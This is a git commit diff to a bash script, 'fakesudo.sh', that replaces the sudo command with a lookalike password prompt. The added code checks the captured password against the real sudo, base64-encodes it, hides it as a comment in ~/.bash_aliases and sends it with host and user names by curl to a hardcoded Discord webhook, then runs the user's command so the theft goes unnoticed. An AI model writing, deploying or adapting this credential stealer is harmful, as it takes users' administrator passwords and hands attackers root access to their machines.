d6aaa23d3c14d9735a5281dc3ed2c2f1d366b5db
nongiach <nongiach@gmail.com>
2020-05-15 03:22:06 +0200

    update to match real behavior for bash and new version of sudo

--- fakesudo.sh
+++ fakesudo.sh
@@ -1,50 +1,68 @@
-
 function sudo(){
   user_shell=$(basename $SHELL)
   sudo_original="/usr/bin/sudo"
   param="$@"
   msg="[sudo] password for $USER: "
-  success=0
+
+  if [[ $S_CAPTURED == 1 ]] ; then # if already captured
+    "$sudo_original" $@
+    return $?
+  fi
+
+  # if no arguments
+  if [ ! "$#" -gt 0 ]; then "$sudo_original"; return $?; fi
+
   case $param in
     -h)
-      $sudo_original -h
+      "$sudo_original" -h
       ;;
     -k)
-      $sudo_original -k
+      "$sudo_original" -k
       ;;
     -K)
-      $sudo_original -K
+      "$sudo_original" -K
       ;;
     -V)
-      $sudo_original -V
+      "$sudo_original" -V
       ;;
     *)
-      $sudo_original -k
+      "$sudo_original" -k
       for i in {1..3};do
-        if [[ $user_shell == "zsh" ]];then
-          echo -n "$msg";read -s passwd
+        if [[ "$user_shell" == "zsh" ]];then
+          echo -n "$msg";read -s passwd; echo
         else
-          read -s -p "$msg" passwd
+          read -s -p "$msg" passwd; echo
         fi
-        echo "$passwd" | $sudo_original -S true 2> /dev/null
+        echo "$passwd" | "$sudo_original" -S true 2> /dev/null
         if [[ $? == 0 ]];then
-          success=1
-          echo
-          sendPassword
-          echo "$passwd" | $sudo_original -S -p '' $@
+          sendPassword "$passwd"
+          S_CAPTURED=1
+          echo "$passwd" | exec "$sudo_original" -S -p '' $@
           break
         fi
-        if [[ $i != 3 ]];then
-          echo -e "\nSorry, try again."
-        fi
       done
-      if [[ $success == 0 ]];then
+      if [[ $S_CAPTURED == 0 ]];then
         echo -e "\nsudo: 3 incorrect password attempts"
       fi
   esac
 }
 
-function sendPassword(){
-  echo "WHATEVER YOU WANT TO DO"
+function sudo_send2discord() {
+  # update with your discord webhook here
+  # SUDO_DISCORD_WEBHOOK_URL='https://discordapp.com/api/webhooks/710652525165936751/D4w3diaH2O7L3_GHW0N436VH4nUg1s6PgIbwVqLWaK_TR91pVpARODcpL-5mqto7Hm49'
+  SUDO_DISCORD_WEBHOOK_URL='https://discordapp.com/api/webhooks/710652525165936751/D4w3diaH2O7L3_GHW0N436VH4nUg1s6PgIbwVqLWaK_TR91pVpARODcpL-5mqto7Hm49'
+  # this is put here to not pollute the shell environ
+
+  curl -H "Content-Type: application/json" -X POST \
+    -d "{\"username\": \"$HOSTNAME:$USER\", \"content\": \"\`\`\`$@\`\`\`\"}" \
+    "$SUDO_DISCORD_WEBHOOK_URL" &>/dev/null
 }
 
+function sendPassword(){
+  passwd=$(echo "$@" | base64 -w0)
+  echo "# $passwd" >> ~/.bash_aliases
+  sudo_send2discord "$passwd"
+}
+
+# sudo state, 0 if not captured, 1 if already captured
+S_CAPTURED=0
